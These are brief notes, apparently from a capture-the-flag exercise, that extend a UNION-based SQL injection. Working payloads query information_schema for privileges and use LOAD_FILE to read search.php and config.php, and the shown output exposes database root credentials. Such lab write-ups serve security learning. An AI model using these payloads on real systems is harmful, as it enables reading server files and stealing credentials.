building off of the union injection -> 


we know we are root@localhost so lets figure out what our privileges are -> 

SYNTAX: foo' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -

in the section we see its looking at the search.php file so pull it up with this -> foo' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -

we notice config.php being hte import -> 

run this syntax: foo' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -

output: localhost', 'DB_USERNAME'=>'root', 'DB_PASSWORD'=>'dB_pAssw0rd_iS_flag!',
